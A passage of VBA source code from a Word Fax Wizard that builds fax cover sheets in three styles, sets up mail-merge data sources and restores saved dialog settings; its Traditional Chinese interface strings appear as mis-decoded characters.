    strAsstMsgRcpntsOrdDoc = "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A¨º»ò¡u©m¦W¡vÄæ¦ìªº¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦³³Ìªñ¶Ç¯u¹ï¶Hªº¦W¦r¡C±z¥i¥H±q¤¤¿ï¨ú¦¬¥óªÌ©m¦W´¡¤J«Ê­±ªí³æ¤¤¡C"
    

    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iLONG_NAME) = "±M·~¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iSHORT_NAME) = "cPrfax.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iLONG_NAME) = "²{¥N¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iSHORT_NAME) = "cCofax.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iLONG_NAME) = "¨å¶®¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iSHORT_NAME) = "cElfax.dot"
    
    rgstrNotes(iSTY_PROFESSIONAL) = "µù¸Ñ¡G"
    rgstrNotes(iSTY_CONTEMPORARY) = "µù¸Ñ¡G"
    rgstrNotes(iSTY_ELEGANT) = "µù¸Ñ¡G"
    
    ''**********************************************************************
    'DO NOT LOCALIZE BEYOND THIS POINT.
    ''******************************************************************************
    
    'initialize arrays with the color of the subway shapes for the panels
    For i = 0 To iMAX_PANEL
        rgfSkipPanel(i) = False
        rgiColorShape(i) = COLOR_LIGHTGREY
    Next i

    strBULLET = "•"""
    strSOFT_ENTER = Chr$(11)
    strQUOTE = Chr$(34)
                                        
    'DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET
    'OF DIALOG VALUES IN THE REGISTRY.
    strRegSettingsKey = strREG_SETTINGS_BASE_KEY & "Fax Wizard"
End Sub

'initialises the form
Private Sub InitForm()
    On Error GoTo FatalError
    
    Set formWizard = New formWizDlg
    If formWizard Is Nothing Then
        DisplayErrorMsg strERR_INIT_FORM
        ReportError Err
    End If

    iCurrentPanel = 0
    formWizard.lblWizardName1.Caption = " " & strWizLongName & " "
    Exit Sub

FatalError:
    DisplayErrorMsg strERR_INIT_FORM
    ReportError Err
    
End Sub

Sub InitWizard(fDummy As Boolean)
    
    InitForm
    InitWizardStrings

    fNoCovSht = False
    fStylesCopied = False
End Sub

Public Sub SetMainDoc(fDummy As Boolean)
Dim cDocs As Integer
Dim i As Integer

    On Error GoTo FatalError
    
    fDocIsFormLtr = False
    fDocPresent = False
    fDocChanged = False
    cDocs = Application.Documents.Count
    
    If cDocs > 1 Then
    'we don't want to add the doc. that was just created thro' FileNew
        For i = 2 To cDocs
            formWizard.cboDocList.AddItem Documents(i).Name
        Next i

        formWizard.cboDocList.ListIndex = 0
        fDocPresent = True
    Else
        'just one doc. i.e the freshly created one
        Set objMainDoc = Nothing
    End If
    Exit Sub

FatalError:
    ReportError Err

End Sub

'checks the kind of document and sets fDocIsFormLtr
Public Sub CheckDocKind(objDoc As Document)
Dim objMM As MailMerge
Dim strQueryString As String
    On Error GoTo LReturn
    fDocIsFormLtr = False
    Set objMM = objMainDoc.MailMerge
    Set objDataSrc = objMM.DataSource
    If objDataSrc.Type = wdNoMergeInfo Then GoTo LReturn
    strQueryString = objDataSrc.QueryString
    strFormLetterSQL = Left$(strQueryString, 255)
    strFormLetterSQL1 = Mid$(strQueryString, 256)
    strConnectString = objDataSrc.ConnectString
    fDocIsFormLtr = True
    
    Exit Sub
LReturn:
    Err.Clear
    fDocIsFormLtr = False
End Sub

Public Sub CreateCoverSheet(fDummy As Boolean)
Dim strDocName As String
Dim objFps As PageSetup

    On Error GoTo FatalError
    Application.StatusBar = strCREATING_DOC
    Application.ScreenUpdating = False
    
    System.Cursor = wdCursorWait

    If fChangeToA4 Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sA4_LEFT_MARGIN
        objFps.RightMargin = sA4_RIGHT_MARGIN
    ElseIf fChangeToLetter Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sLETTER_MARGIN
        objFps.RightMargin = sLETTER_MARGIN
    End If
    
    If (((Not (fDocIsFormLtr)) And (iNumRcpnts > 1)) Or fDocIsFormLtr) Then _
        CreateDataSource
        
    StatusBar = strCREATING_DOC
    Select Case iFaxStyle
    Case iSTY_PROFESSIONAL
        CreateProfContCoverSheet
    Case iSTY_CONTEMPORARY
        CreateProfContCoverSheet
    Case iSTY_ELEGANT
        CreateElegCoverSheet
    End Select
    
    If (fDocPresent) And (Not (formWizard.optCovSht.Value)) Then
        strDocName = ActiveWindow.Caption & " - " & objMainDoc.Name & strWINDOW_CAPTION
    Else
        strDocName = ActiveWindow.Caption & strCOVER_SHEET_CAPTION
    End If
        
    With ActiveWindow
        .Caption = strDocName

        .View.TableGridlines = False
    End With
    ActiveDocument.UndoClear
    Selection.HomeKey wdStory
    
    With ActiveDocument.Content
        .SpellingChecked = True
        .GrammarChecked = True
    End With
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'creates a data source for the cover sheet in the temp. directory
Private Sub CreateDataSource()
Dim objRng As Range
Dim strPath As String
Dim objDataSrcDoc As Document, objMM As MailMerge
Dim strDataSrcName As String
    On Error GoTo FatalError
    
    Set objMM = ActiveDocument.MailMerge
    objMM.MainDocumentType = wdFormLetters
    
    If (fDocIsFormLtr) Then
        objMM.OpenDataSource objDataSrc.Name, Connection:=strConnectString
        objMM.DataSource.QueryString = strFormLetterSQL & strFormLetterSQL1
        Exit Sub
    End If
    
    Set objDataSrcDoc = Application.Documents.Add
    
    Set objRng = objDataSrcDoc.Content
    
    CreateTableFromFaxInfo objRng
    
    strPath = Options.DefaultFilePath(wdTempFilePath)
    If Right$(strPath, 1) <> strPathSeparator Then _
        strPath = strPath & strPathSeparator
        
    strDataSrcName = strPath & "~$CovSht@" & Format$(Date, "dd-mm-yy") & "," & Format$(Time, "hh-mm-ss") & ".tmp"
    objDataSrcDoc.SaveAs strDataSrcName, wdFormatDocument
    objDataSrcDoc.Close wdDoNotSaveChanges
    
    'attach the data source doc. to activedocument (cover sheet)
    objMM.OpenDataSource strDataSrcName
    
    Exit Sub
FatalError:
    ReportError Err
End Sub


'creates a table in the data source document with names and numbers
'the format of the table is just like how one would create a data source doc.
'through Word
Private Sub CreateTableFromFaxInfo(objRange As Range)
Dim strText As String
Dim i As Integer

    On Error GoTo FatalError

    strText = strFLD_FAX_NAME & vbCr & strFLD_FAX_NUMBER
    
    'collect the names and numbers entered by the user
    For i = 1 To iNumRcpnts
        strText = strText & vbCr & rgstrRcpntFaxNames(i - 1) & vbCr & rgstrRcpntFaxNums(i - 1)
    Next i

    objRange.InsertBefore strText
    'Add a table with 2 columns and iNumRcpnts+1 rows
    objRange.Select
    Selection.ConvertToTable vbCr, iNumRcpnts + 1, 2
    
    Exit Sub
FatalError:
    ActiveDocument.Close wdDoNotSaveChanges 'close the data source doc.
    ReportError Err
End Sub

Public Function FCopyStyles(iStyle As Integer) As Boolean
    Dim strStyleName As String
    Dim strLongName As String
    Dim i As Integer
    
    On Error GoTo TemplateNotFound
LFindTemplate:
    ' Attempt to locate longname, then shortname template file
    i = iLONG_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iLONG_NAME)
    strLongName = strStyleName
    If Dir(strStyleName) <> "" Then GoTo LApplyStyles
LTryShortName:
    i = iSHORT_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iSHORT_NAME)

LApplyStyles:
    StatusBar = strAPPLYING
    
    ' Get styles
    ActiveDocument.CopyStylesFromTemplate (strStyleName)
    
    ' No Error
    fStylesCopied = True
    StatusBar = ""
    FCopyStyles = True
    Exit Function
    
TemplateNotFound:
    If i = iLONG_NAME Then
        i = iSHORT_NAME
        Err.Clear
        GoTo LTryShortName
    End If
    DisplayErrorMsg strERR_STYLE_NOT_FOUND & strLongName & strERR_STYLE_NOT_FOUND2
    fStylesCopied = False
    StatusBar = ""
    FCopyStyles = False
End Function

'creates professional/Contemporary style cover sheet
Private Sub CreateProfContCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table

    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        InsertContAutoText
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    InsertReturnAddress
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (iFaxStyle = iSTY_PROFESSIONAL) Then
        If (Len(strCmpnyName)) Then
            objActiveRange.Style = strSTY_COMPANY_NAME
            objActiveRange.InsertBefore strCmpnyName & vbCr
            objActiveRange.Collapse wdCollapseEnd
        End If
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    

    
    Set objRngTextTable = objActiveRange.Duplicate
    
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    objActiveRange.InsertBefore strTO
    Set objRngBuffer1 = objActiveRange.Duplicate

    'insert recipient name
    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNames(0) & vbTab
    Else
        'insert appropriate field
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True
            If Len(strMFLastName) Then
                objActiveRange.InsertAfter strSPACE
                objActiveRange.Collapse wdCollapseEnd
                InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
            End If
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert From:
    objActiveRange.InsertBefore strFROM
    Set objRngBuffer2 = objActiveRange.Duplicate
    
    'insert sender's name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert macrobutton field.
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'next 3 lines in "Message Header" style
    'Insert Fax Number
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX
    Set objRngBuffer1 = objActiveRange.Duplicate

    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNums(0) & vbTab
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert the appropriate field
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Date
    objActiveRange.InsertBefore strDATE
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True

    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    
    'Next line
    'Insert Phone
    objActiveRange.InsertBefore strPHONE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Pages:
    objActiveRange.InsertBefore strPAGES
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'Insert Re:
    objActiveRange.InsertBefore strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert CC:
    objActiveRange.InsertBefore strCC
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 4, 4, AutoFit:=True, Format:=0)
    With objTable
        .Borders.Enable = False
        .Rows.SpaceBetweenColumns = 0
        If iFaxStyle = iSTY_CONTEMPORARY Then
            .Rows.LeftIndent = sCONT_LEFT_INDENT
        Else 'for professional style.
        'contemporary has autotext entry to insert the lines.
            Selection.Cells.AutoFit
            .Columns(2).Width = sCONT_WIDTH_COL1
            .Columns(4).Width = sCONT_WIDTH_COL1
            .Rows.Borders(wdBorderHorizontal).Visible = True
            .Borders(wdBorderBottom).Visible = True
        End If
    End With
    'convert to table inserts a vbCr after the table.
    InsertCheckBoxes
    InsertBodyText
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        Set objActiveRange = ActiveDocument.Content
        objActiveRange.Collapse wdCollapseStart
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) ' & vbCr
    '    objActiveRange.Collapse wdCollapseEnd
    End If
    Exit Sub
FatalError:
    ReportError Err
End Sub
'creates an elegant style cover sheet
Private Sub CreateElegCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table, objRow As Row
Dim i As Integer

    On Error GoTo FatalError
    
    InsertReturnAddress
    
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (Len(strCmpnyName)) Then
        objActiveRange.Style = strSTY_COMPANY_NAME
        objActiveRange.InsertBefore strCmpnyName & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    'Insert title
    objActiveRange.Style = strSTY_DOC_LABEL
    objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
    objActiveRange.Collapse wdCollapseEnd
    
    Set objRngTextTable = objActiveRange.Duplicate
        
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To: & From:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    
    objActiveRange.InsertBefore strTO & vbTab & strFROM
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True 'Preserveformatting
        If Len(strMFLastName) Then
            objActiveRange.InsertAfter strSPACE
            objActiveRange.Collapse wdCollapseEnd
            InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
        End If
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNames(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
    End If
    
    'insert name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL

    'next 3 lines in "Message Header" style
    'Insert FaxNumber and Date
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX_NUMBER & vbTab & strDATE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    
    'insert recipient number
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True 'Preserveformatting
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNums(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
    End If
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Insert CompanyName & Pages
    objActiveRange.InsertBefore strCOMPANY & vbTab & strTOTAL_NO_PAGES
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert company name
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMPANY, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Phone Number & Re:
    objActiveRange.InsertBefore strPHONE_NUMBER & vbTab & strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End '- 1 'don't want the last CR
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 10, 2, Format:=0)
    objTable.Borders.Enable = False
    
    For i = 2 To 8 Step 2
        Set objRow = objTable.Rows(i)
        objRow.Range.ParagraphFormat.LeftIndent = 0.25 * 72
        'don't need the bottom border for the last row.
        If i <> 8 Then objRow.Borders(wdBorderBottom) = True
    Next i
    
    InsertCheckBoxes
    InsertBodyText
    
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Get the names of the merge fields to be inserted in the cover sheet
'If the original doc. is a form letter then we need to insert the merge fields
'selected by the user. If not then insert the merge field names we created in the
'data source we created
Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String)
    On Error GoTo FatalError
    
    If (fDocIsFormLtr) Then
        'user selects names from drop-down of all possible mergefields in data source
        strFirstName = formWizard.cboFldsRcpntFirstName.Text
        strLastName = formWizard.cboFldsRcpntLastName.Text
        If (strLastName = strNONE) Then strLastName = ""
        strFaxNum = formWizard.cboFldsFaxNum.Text
    Else
       strFirstName = strFLD_FAX_NAME
       strLastName = ""
       strFaxNum = strFLD_FAX_NUMBER
    End If
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertReturnAddress()
Dim strFromPh As String
Dim strFromFax As String
Dim strText As String, strAddress As String

    On Error GoTo FatalError
    
    'Set objActiveRange = ActiveDocument.Content
    'If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd

    strFromPh = formWizard.txtSenderPhone.Text
    strFromFax = formWizard.txtSenderFax.Text
    strAddress = formWizard.txtMailingAddr.Text

    Select Case iFaxStyle
    
    Case iSTY_CONTEMPORARY, iSTY_PROFESSIONAL
        strText = strAddress
        If Len(strText) Then strText = strText & vbCr
        If Len(strFromPh) <> 0 Then _
            strText = strText & strPHONE & strSPACE & strFromPh & vbCr

        If Len(strFromFax) <> 0 Then _
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        If Len(strText) = 0 Then strText = strText & vbCr
    Case iSTY_ELEGANT
        strText = StrReplaceCrLfWithText(strAddress, strSPACE & strBULLET & strSPACE)
        If Len(strText) Then strText = strText & vbCr
        'if you have phone number
        If Len(strFromPh) <> 0 Then
            strText = strText & strPHONE & strSPACE & strFromPh
            'check if you also have fax
            'instead of vbCr use space, bullet, space combination
            If Len(strFromFax) <> 0 Then _
                strText = strText & strSPACE & strBULLET & strSPACE & strFAX & strSPACE & strFromFax
            strText = strText & vbCr
        'check if you have only Fax
        ElseIf Len(strFromFax) <> 0 Then
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        End If
        
    End Select
    
    objActiveRange.Style = strSTY_RETURN_ADDR
    objActiveRange.InsertBefore strText
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
'Inserts the check-boxes and the text associated with them
Private Sub InsertCheckBoxes()
Dim i As Integer
Dim R1 As Range
    On Error GoTo FatalError
    objActiveRange.Style = strSTY_MSG_HDR_LAST
    objActiveRange.Collapse wdCollapseEnd
    Set R1 = objActiveRange.Duplicate

    Set R1 = objWizTemplate.AutoTextEntries(strAT_UNCHKD_BOX).Insert(R1)

    objActiveRange.End = R1.End + 1
    objActiveRange.Start = R1.End + 1
    objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(1) + vbTab
    objActiveRange.Style = wdStyleEmphasis

    objActiveRange.Collapse wdCollapseEnd
    For i = 2 To 5
        objActiveRange.FormattedText = R1.FormattedText
        objActiveRange.Collapse wdCollapseEnd
        objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(i) + vbTab
        objActiveRange.Style = wdStyleEmphasis
        objActiveRange.Collapse wdCollapseEnd
    Next i

    'delete the previous character i.e the last tab
    objActiveRange.Start = objActiveRange.End - 1
    objActiveRange.Delete
    objActiveRange.InsertParagraph
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

Private Sub InsertBodyText()
Dim R1 As Range
Dim strAfterText As String
    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_ELEGANT Then
        strAfterText = vbCr
    Else
        strAfterText = strSPACE & strSPACE
    End If

    
    If iFaxStyle = iSTY_PROFESSIONAL Then _
        objActiveRange.InsertAfter strBULLET

    objActiveRange.InsertAfter rgstrNotes(iFaxStyle) & strAfterText
    
    Set R1 = objActiveRange.Duplicate
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMMENTS, False 'PreserveFormatting
    objActiveRange.Style = wdStyleBodyText
    R1.Style = strSTY_MSG_HDR_LABEL
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertContAutoText()

    On Error GoTo FatalError
    Set objActiveRange = objWizTemplate.AutoTextEntries(strCNTMPGFX2).Insert(objActiveRange, True)
   
    Exit Sub
FatalError:
    DisplayErrorMsg strERR_AUTOTEXT_NOT_FOUND
End Sub


Public Sub RestoreDialogValues(fDummy As Boolean)
    Dim fAddrBkEnable As Boolean
    Dim i As Integer
    Dim strChkdAddr As String
    
    On Error GoTo FatalError
    StatusBar = strRST_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
   
    fAddrBkEnable = Application.MAPIAvailable
    formWizard.cmdRcpntsAddrBk.Enabled = fAddrBkEnable
    formWizard.cmdSenderAddrBk.Enabled = fAddrBkEnable
    
'Setting options in Panel1 depending on whether a doc. is present or not
    If fDocPresent Then
        formWizard.optCurDoc.Value = True
        formWizard.optCurDocCovShtYes.Value = True
    Else
        'disable a bunch of options
        formWizard.optCurDoc.Enabled = False
        formWizard.cboDocList.Enabled = False
        formWizard.optCurDocCovShtNo.Enabled = False
        formWizard.optCurDocCovShtYes.Enabled = False
        formWizard.optCovSht.Value = True
        formWizard.frmRcpntsFormDoc.Visible = False
        formWizard.frmRcpntsOrdDoc.Visible = True
    
    End If

    'Panel2
    'read values from registry.
    iFaxOption = IRestorePref("Fax Option", 0)
    If InStr(UCase$(System.OperatingSystem), "NT") Then
        fMSFAXEnabled = False
        formWizard.optMSFax.Enabled = False
    Else
        fMSFAXEnabled = True
    End If
    'set printer in combo-box before disabling frmFaxDriver.
    GetAllPrinters
        
    'the controls are assumed to be enabled initially and are explicityly
    'only turned off, never turned on.
    If (iFaxOption = iMS_FAX) And Not (fMSFAXEnabled) Then
        If iTotalNumPrinters > 0 Then
            iFaxOption = iDIFF_FAX
        Else
            iFaxOption = iNO_FAX
        End If
    End If
    Select Case iFaxOption
        Case iMS_FAX:
            formWizard.optMSFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case iDIFF_FAX:
            formWizard.optDifferentFax.Value = True
        Case iNO_FAX:
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case Else
            iFaxOption = iNO_FAX
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
            
    End Select
    
    'Panel3
    fRegistryNamesRead = False
    
    'Panel5
    formWizard.txtSenderName.Text = Application.UserName

    i = ICountLines(Application.UserAddress, strChkdAddr, iMAX_ADDR_LINES)
    formWizard.txtMailingAddr.Text = strChkdAddr
    formWizard.txtSenderFax.Text = StrRestorePref("Sender Fax", "")
    formWizard.txtSenderPhone.Text = StrRestorePref("Sender Phone", "")
    
    'Panel 4
    iFaxStyle = IRestorePref("Coversheet Style", 0)
    If (iFaxStyle < iSTY_PROFESSIONAL) Or (iFaxStyle > iSTY_ELEGANT) Then _
        iFaxStyle = iSTY_PROFESSIONAL
    Select Case iFaxStyle
        Case iSTY_PROFESSIONAL
            formWizard.optStyleProf.Value = True
            formWizard.lblStyle0.Visible = True
        Case iSTY_CONTEMPORARY
            formWizard.optStyleCont.Value = True
            formWizard.lblStyle1.Visible = True
        Case iSTY_ELEGANT
            formWizard.optStyleEleg.Value = True
            formWizard.lblStyle2.Visible = True
    End Select
    
    On Error GoTo -1 'reset error trap
    On Error Resume Next
    formWizard.txtCompany.Text = System.PrivateProfileString("", strREGKEY_CMPNY_NAME, strVALKEY_CMPNY_NAME)
    fSettingsRestored = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'sets default merge fields
Public Sub FillMergeFields(fDummy As Boolean)
Dim i As Integer, iCount As Integer
Dim iFirstName As Integer
Dim iLastName As Integer
Dim iFax As Integer
Dim rgstrNames() As String
Dim objFieldNames As MailMergeFieldNames
Dim objTempDoc As Document

    On Error GoTo FatalError
    iFirstName = -1
    iLastName = -1
    iFax = -1
    
    'reset the query options so that all names in the data src are selected
    
    Set objFieldNames = objDataSrc.FieldNames
    iCount = objFieldNames.Count
    ReDim rgstrNames(iCount - 1)
    For i = 1 To iCount
        rgstrNames(i - 1) = objFieldNames(i).Name
        If InStr(rgstrNames(i - 1), strFLD_NAME) Then
            If iFirstName = -1 Then
                iFirstName = i - 1
